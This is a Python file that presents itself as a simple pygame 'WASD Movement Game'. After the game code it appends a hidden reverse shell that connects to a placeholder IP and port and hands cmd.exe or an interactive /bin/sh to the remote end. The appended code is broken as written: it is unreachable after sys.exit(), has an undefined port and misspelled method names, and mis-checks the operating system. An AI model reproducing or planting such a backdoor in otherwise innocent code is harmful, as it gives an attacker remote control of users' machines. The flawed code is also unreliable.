import subprocess, socket, os, pygame, sys

# Initialize pygame
pygame.init()

# Set up display
width, height = 800, 600
screen = pygame.display.set_mode((width, height))
pygame.display.set_caption("WASD Movement Game")

# Set up the player
player_size = 50
player_color = (255, 0, 0)  # Red color
player_x = width // 2 - player_size // 2
player_y = height // 2 - player_size // 2
player_speed = 5

# Game loop
running = True
while running:
    screen.fill((240, 240, 240))  # Fill the screen with a light grey color

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    # Get the keys pressed
    keys = pygame.key.get_pressed()

    # Move player based on WASD keys
    if keys[pygame.K_w]:  # Move up
        player_y -= player_speed
    if keys[pygame.K_s]:  # Move down
        player_y += player_speed
    if keys[pygame.K_a]:  # Move left
        player_x -= player_speed
    if keys[pygame.K_d]:  # Move right
        player_x += player_speed

    # Draw the player (red square)
    pygame.draw.rect(screen, player_color, (player_x, player_y, player_size, player_size))

    # Update the display
    pygame.display.flip()

    # Set the frames per second
    pygame.time.Clock().tick(60)

# Quit pygame
pygame.quit()
sys.exit()

ip="ip"
port=port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
if os == "nt":
    subprocess.call(["cmd.exe"], stdin=s.filno(), stdout=s.fileno, stderr=s.filno())
else:
    subprocess.call(["/bin/sh", "-i"], stdin=s.filno(), stdout=s.fileno, stderr=s.filno())